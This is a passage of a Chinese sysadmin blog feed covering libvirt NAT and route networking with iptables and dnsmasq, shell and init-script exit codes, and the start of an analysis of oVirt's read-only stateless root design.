2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><ul><li>/etc/libvirt/qemu/networks/  virsh net-define的network会保存到这</li><li>/var/lib/libvirt/network/  net-start启动了的network同时也会会保存到这</li><li>/etc/libvirt/qemu/networks/autostart/  net-autostart的network同时也会保存到这</li></ul><p>接下来，我们需要修改em1的配置并将其桥接到virbr1上</p><p>ifcfg-em1</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DEVICE="em1"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ONBOOT="yes"</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BRIDGE=virbr1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接着启动em1</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ifup em1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此em1就被桥接到了virbr1上，可以使用下面的命令检查</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">brctl show</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>现在我们需要在本机添加一条默认路由，不然虚拟机是访问不了外面的：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">route add default gw 192.168.1.1 dev virbr1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这里的192.168.1.1是真实的路由。至此，问题已经解决了。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="自定义nat网络">自定义nat网络<a class="hash-link" href="#自定义nat网络" title="标题的直接链接">​</a></h2><p>下面说说问题1的解决方法：
既然知道了nat出去的虚拟机只能访问外网而外网却不能访问进来，nat又是通过iptables来做的，也就是当libvirt每次启动的时候都会往iptables最前面插入自己的规则以保证nat的虚拟机能正常访问外网，那么我们是不是可以通过修改iptables的规则来实现呢，比如我们需要一个内网ip的虚拟机对外提供80服务，那么我们就把物理机的80端口映射到这台虚拟机的80端口上，因为我们的物理机是可以直接和虚拟机通信的，只是外网不能而已，下面添加规则：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A PREROUTING -p tcp -i virbr1 --dport 80  -j DNAT --to-destination 192.168.122.2:80</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>这样我们对外部访问80端口进来的数据进行了dnat，而出去的我们不用snat，只需要再添加如下规则：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此问题看似得到解决，但是我们忽略了一个关键的问题，那就是每当libvirt启动的时候就会往表的最前面插入它自己的规则，而iptables的规则是有先后顺序的，也就是说，我们自己添加的规则在libvirtd服务重启之后即被libvirt定义的规则所淹没，怎么办呢，我现在只想到了这么一个方法，直接修改libvirtd的启动脚本，在它的规则生效之后插入我们自定义的规则：</p><p>vi  /etc/init.d/libvirtd</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo -n $"Starting $SERVICE daemon: "</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    initctl_check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mkdir -p /var/cache/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rm -rf /var/cache/libvirt/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    KRB5_KTNAME=$KRB5_KTNAME daemon --pidfile $PIDFILE --check $SERVICE $PROCESS --daemon $LIBVIRTD_CONFIG_ARGS $LIBVIRTD_ARGS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RETVAL=$?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ $RETVAL -eq 0 ] &amp;&amp; touch /var/lock/subsys/$SERVICE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sleep 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iptables -D FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>至此问题基本解决。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="route网络转换nat网络">route网络转换nat网络<a class="hash-link" href="#route网络转换nat网络" title="标题的直接链接">​</a></h2><p>另外一个问题，我们前面有发现route和nat的网络区别仅仅是一个做了nat的iptables规则一个没有，那么我们可不可以自己在iptables里面添加相应的规则将route网络变身为nat网络呢？答案肯定是可以的，只需要添加上下面的规则即可,原理还请观看本文的同学自己分析，这里假设我们route网络给虚拟机分配的ip是192.168.100.0/24网段：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -d ! 192.168.100.0/24 -j MASQUERADE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A FORWARD --destination 192.168.100.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="自定义dnsmasq">自定义dnsmasq<a class="hash-link" href="#自定义dnsmasq" title="标题的直接链接">​</a></h2><p>这里再添加一个可以手工启动dnsmasq的小脚本</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token shebang important">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">brctl addbr routebr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ifconfig</span><span class="token plain"> routebr </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.122.1 netmask </span><span class="token number" style="color:#36acaa">255.255</span><span class="token plain">.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A POSTROUTING -s </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.122.0/24 -d </span><span class="token operator" style="color:#393A34">!</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.122.0/24 -j MASQUERADE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A FORWARD --destination </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.122.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/dnsmasq </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--strict-order </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--bind-interfaces </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--pid-file</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/local/vps/network/default.pid </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--conf-file</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--except-interface lo </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--listen-address </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.122.1 </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-range </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.122.2,192.168.122.254 </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-leasefile</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/local/vps/network/dnsmasq/default.leases </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-lease-max</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">253</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-no-override </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-hostsfile</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/local/vps/network/dnsmasq/default.hostsfile</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="重启network导致网络中断">重启network导致网络中断<a class="hash-link" href="#重启network导致网络中断" title="标题的直接链接">​</a></h2><p>当我们需要实时修改network的配置并使之生效的时候，就得重新启动此network，也就是需要net-destroy再net-start一下，我们的配置才能生效，但是随之而来的问题是，当network被重新启动之后，虚拟机便无法访问网络了，除非把虚拟机的network interface重新attach一下，或者等到虚拟机重新启动，那么为什么会出现这样的问题呢？我们先从它的表象开始分析，至于是否要追究到源码里面就取决于同学们自己了，反正我暂时没那功夫。这里仅仅是抛出来了一块砖。</p><p>当一个network启动之后，会自动生成一个虚拟网卡接口如virbr1，也会生成其他一些需要的东西，而重新启动了libvirt的network之后这个接口也会被重启，所以就导致了中途有一个中断的过程，</p><p>那事情就比较清晰了，如果你将libvirt启动网络的所有过程拆分开来一个一个的手动生成，需要修改某一部分配置的时候实际上你只需要修改对应的配置文件而不需要重新启动这个virbr1接口，比如上面提到的mac+ip的绑定，如果把dnsmasq独立出来，不让libvirt接管，那么增加了mac+ip绑定之后，仅仅需要重启dnsmasq这个服务。</p>]]></content>
        <category label="libvirt" term="libvirt"/>
        <category label="network" term="network"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[正确使用shell返回值]]></title>
        <id>/2013/05/17/bash-shell-exit-code</id>
        <link href="https://itxx00.github.io/notes/blog/2013/05/17/bash-shell-exit-code"/>
        <updated>2013-05-17T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[about shell exit code]]></summary>
        <content type="html"><![CDATA[<blockquote><p>编写shell脚本的时候，正确使用返回值是运维人员的基本操守</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="1常见返回值">1.常见返回值<a class="hash-link" href="#1常见返回值" title="标题的直接链接">​</a></h2><p>下表列出了常见shell命令的退出返回值：</p><table><thead><tr><th>返回值</th><th align="left">含义</th><th align="center">示例</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td align="left">各种常见错误</td><td align="center">let "var1 = 1/0"</td><td>shell里面最常见的错误返回值</td></tr><tr><td>2</td><td align="left">shell内建功能使用错误</td><td align="center">empty_function() {}</td><td>常见于关键字或者命令出错</td></tr><tr><td>126</td><td align="left">命令无法执行</td><td align="center">/dev/null</td><td>由于权限等导致的命令无法执行</td></tr><tr><td>127</td><td align="left">命令无法找到</td><td align="center">illegal_command</td><td>一般是PATH环境变量不对等</td></tr><tr><td>128</td><td align="left">退出返回值错误</td><td align="center">exit 3.14159</td><td>返回值只能是整数，小数就不对了</td></tr><tr><td>128+n</td><td align="left">信号 "n"+128</td><td align="center">kill -9 $PPID of script</td><td>$? 即返回 137 (128 + 9)</td></tr><tr><td>130</td><td align="left">ctrl+c 退出</td><td align="center">Ctl-C</td><td>其实ctrl+c返回的是2 (130 = 128 + 2)</td></tr><tr><td>255*</td><td align="left">返回值超出可接受的范围</td><td align="center">exit  -1</td><td>只能是 0 - 255</td></tr></tbody></table><h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-init标准返回值">2. init标准返回值<a class="hash-link" href="#2-init标准返回值" title="标题的直接链接">​</a></h2><p>下表列出了关于/etc/init.d/目录下启动控制脚本的标准返回值：</p><ul><li>0    程序在运行或者服务状态OK</li><li>1    程序已经死掉，但是 pid文件仍在 /var/run目录下存在</li><li>2    程序已经死掉，但是lock文件仍在 /var/lock 目录下存在</li><li>3    程序没有运行</li><li>4    程序运行状态未知</li><li>5-99    供LSB扩展的保留段</li><li>100-149    供特定系统发行版使用的保留段</li><li>150-199    供特定程序使用的保留段</li><li>200-254    保留段</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-建议返回值">3. 建议返回值<a class="hash-link" href="#3-建议返回值" title="标题的直接链接">​</a></h2><p>在写shell脚本的时候需要注意自定义的退出返回值最好不要与上面表格中所定义的重复，对于管理人员来说养成良好的习惯有助于遇到错误时作出正确的判断。
根据上表至少可以得出，在自定义返回值的时候：</p><ul><li>最好不要用的：0-4 126-130 255</li><li>应避免使用的：5-99</li><li>可随意使用的：100-125 131-254</li></ul><p>参考文档:</p><ul><li><p>[1]<!-- --> <a href="http://tldp.org/LDP/abs/html/exitcodes.html" target="_blank" rel="noopener noreferrer">http://tldp.org/LDP/abs/html/exitcodes.html</a></p></li><li><p>[2]<!-- --> <a href="http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html" target="_blank" rel="noopener noreferrer">http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html</a></p></li></ul>]]></content>
        <category label="bash" term="bash"/>
        <category label="exitcode" term="exitcode"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Ovirt中的stateless实现机制分析]]></title>
        <id>/2013/03/14/ovirt-stateless</id>
        <link href="https://itxx00.github.io/notes/blog/2013/03/14/ovirt-stateless"/>
        <updated>2013-03-14T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[简单分析ovirt的stateless实现机制]]></summary>
        <content type="html"><![CDATA[<blockquote><p>我发现ovirt的node也就是运行虚拟机的主机被设计成了这样：整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，明白了为什么需要这种stateless也就是无状态的设计</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="ovirt简介">Ovirt简介<a class="hash-link" href="#ovirt简介" title="标题的直接链接">​</a></h2><p>这是来自centos wiki中的描述：</p><blockquote><p>oVirt 是个管理虚拟化的应用程序。言下之意就是你可利用 oVirt 的管理界面（oVirt 引擎）来管理硬件节点、存储及网络资源，并部署及监控在你的数据中心内运行的虚拟机器。
如果你熟识 VMware 的产器，oVirt 在理念上与 vSphere 类同。Red Hat 企业级虚拟化产品以 oVirt 作为基础，这个上游计划内开发的新功能，日后亦会在获支持的产品内出现。</p></blockquote><p>ovirt是一套虚拟化管理的系统，其对标产品是vmware的vsphere，它分为ovirt-engine和ovirt-node，可以用ovirt的这套系统来管理虚拟机群，现在虚拟化相关产品众多，微软，vmware，oracle等都在做这方面的产品，于是IBM红帽ubuntu等厂商就联合起来开始搞这个东西了，红帽很早就开始投入kvm了，红帽做的是RHEV的整套系统，也分为node和engine只是名字不一样，后来干脆就把node的RHEV-H给贡献出来，大家一起搞ovirt了。前几天我也试用了一下ovirt和RHEV，发现他们的node也就是运行虚拟机的主机被设计成了这样: 整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，才知道这叫stateless，无状态，这么做的好处是运行环境和存储分离，提高整体可用性。在分析了ovirt中的stateless实现机制之后，下面将在centos6上尝试手工配置，过程中请教了几位ovirt的开发,再次表示感谢</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="关于stateless">关于stateless<a class="hash-link" href="#关于stateless" title="标题的直接链接">​</a></h2><p>这种stateless的设计来自很早之前红帽在fedora里面做的尝试，目的是把系统做成liveCD，下面是一些关于stateless的描述：</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">read-only root file system(stateless linux)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Readonly root support.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This was add to Fedora for Stateless Linux, i.e. for creating live Fedora CDs.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">How to use:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * Edit `/etc/sysconfig/readonly-root`. Set 'READONLY' to 'yes'.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * Add any exceptions that need to be writable that aren't in the stock `/etc/rwtab` to an /etc/rwtab.d file. (See below)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">How it works:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * On boot, we mount a tmpfs (by default, at /var/lib/stateless/writable), and then parse `/etc/rwtab` and `/etc/rwtab.d/*` for things to put there.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">These files have the format:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`&lt;type&gt;  &lt;path&gt;`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Types are as follows:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * empty: An empty path. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `empty     /tmp`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * dirs: A directory tree that is copied, empty. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `dirs      /var/run`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * files: A file or directory tree that is copied intact. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `files     /etc/resolv.conf`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">A stock rwtab is shipped with common things that need mounted.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">When your computer comes back up, the root and any other system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">partitions will be mounted read-only. All the files and directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listed in `/etc/rwtab` will be mounted read-write on a tmpfs filesystem.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You can add additional files and directories to rwtab to make them</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable after reboot.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Note that this system is stateless. When you reboot again, everything</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">written to the tmpfs filesystem vanishes and the system will be exactly</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">as it was the last time it was booted. You could add a writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filesystem on disk or NFS for writing files you want to retain after</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rebooting.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Take a look at `/etc/rc.d/rc.sysinit` to see how the magic is done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This capability is a "technology preview" (beta) and is buggy. Note that</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`/etc/mtab` and thus "mount" do not show the complete list of filesystems</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">because the /etc directory is on a read-only filesystem. /proc/mounts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">always shows the correct mount information. You could update `/etc/mtab`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from /proc/mounts to correct it both after boot and after running the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mount or umount commands to change mounts.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Run `fgrep -v rootfs /proc/mounts &gt;/etc/mtab` to correct `/etc/mtab`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Note that mounting or symlinking /proc/mounts to /etc/mtab causes other</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">problems such as breaking the df command.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You can change your read-only root filesystem to read-write mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">immediately with this command run by the root user:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`mount -n -o remount,rw /`</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="分析其实现机制">分析其实现机制<a class="hash-link" href="#分析其实现机制" title="标题的直接链接">​</a></h2><p>下面把分析过程记录下来：</p><p>首先我看到的是fstab文件</p><p>/etc/fstab</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div 